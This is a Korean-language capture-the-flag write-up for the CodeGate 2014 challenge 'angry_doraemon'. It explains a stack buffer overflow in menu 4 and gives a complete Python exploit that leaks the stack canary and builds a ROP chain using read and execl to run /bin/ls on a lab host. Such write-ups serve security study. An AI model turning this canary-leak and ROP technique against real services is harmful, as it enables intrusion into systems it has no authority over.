# angry_doraemon
### CodeGate 2014
***angry draemon은 코드게이트 2014 문제입니다!***

angry_doraemon을 실행하여 들어가 보면, 처음 2초 기다리라는 말과 함께 1~5까지 선택지가 나옵니다.

![Alt text](https://github.com/Funniest/System-study/blob/master/angry_doraemon/img/Main.PNG)

여기서 취약한 메뉴의 번호는 4번 입니다. 

![Alt text](https://github.com/Funniest/System-study/blob/master/angry_doraemon/img/Menu_4.PNG)

4번에 들어가서 자세히 보면,

sub esp, 38 -> 0x38만큼 버퍼 생성

[ebp+buf] -> 입력 버퍼는 0x16부터 시작

[ebp+var_C] -> Canary

즉 22만큼 길이를 가지고 있습니다.

대충 정리해 보면 4[buf] + 6[unkonw?] + 4[canary] + 4[unkonw] + 4[fd]가 있습니다.

위의 buffer들 + SFP를하면 총 0x1A(26)만큼의 버퍼가 나오는데 read로 0x6E만큼 받아 오버플로우가 일어납니다.

└ read(fd, buf, 0x6E)

이제 익스플로잇 가젯들을 정리해보면
```
1. Canary 카나리
2. read_plt
3. execl_plt -> system함수를 leak해서 구해도 되지만 execl이 있어 그냥 사용하엿습니다.
4. pppr
5. bss 섹션
```
이 필요합니다.

익스플로잇 순서는
```
1. canary를 leak합니다.
2. 익스플로잇에 필요한 가젯들을 구합니다.
3. 위 가젯들을 이용하여 익스플로잇 합니다.
       └ read_plt를 이용하여 /bin/ls\x00을 씁니다.
       └ raed_plt를 이용하여 /bin/ls\x00 뒤에 ls명령어를 씁니다.
       └ 그 후 execl을 이용하여 1번인자로 /bin/ls와 2번인자로 ls를 주고 실행합니다.
```

### 소스코드
Ubuntu 15 LTS 32bit 환경에서 테스팅 해보았습니다.
```
from socket import *
from struct import *
import time

p = lambda x: pack("<L", x)
up = lambda x: unpack("<L", x)[0]

def sendline(str) :
    s.send(str + "\n")

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.228.138', 8888))

bss = 0x804b080
write_plt = 0x80486E0
read_plt = 0x8048620
execl_plt = 0x8048710
pppr = 0x8048b2c
canary = 0xeede2600

cmd = "ls"
file = "/bin/ls" + '\x00'

print "[*]Exploit!"
print s.recv(1024)
time.sleep(3)
print s.recv(1024)

sendline('4')
print s.recv(1024)

#canary leak
'''
payload = ''
payload += 'y' + 'A' * 10
s.send(payload)

data = s.recv(1024)
print data
canary = "\x00" + data.split("AAAAAAAAAA")[1][0:3]
print "canary : " + hex(up(canary))

print "[+]END..."
s.close()
'''

#buffer overflow
payload = ''
payload += 'y' * 10
payload += p(canary) 
payload += 'A' * 12
#"/bin/sh" read
payload += p(read_plt)
payload += p(pppr)
payload += p(0x04) #fd
payload += p(bss)
payload += p(len(file) + 1)
#"ls" read
payload += p(read_plt)
payload += p(pppr)
payload += p(0x04) #fd
payload += p(bss + len(file) + 1)
payload += p(len(cmd))
#execl
payload += p(execl_plt)
payload += p(pppr)
payload += p(bss)
payload += p(bss + len(file) + 1)
payload += p(0x00)

s.send(payload)

s.send(file)
s.send(cmd)
print s.recv(1024)

sendline('6')
s.close()
```
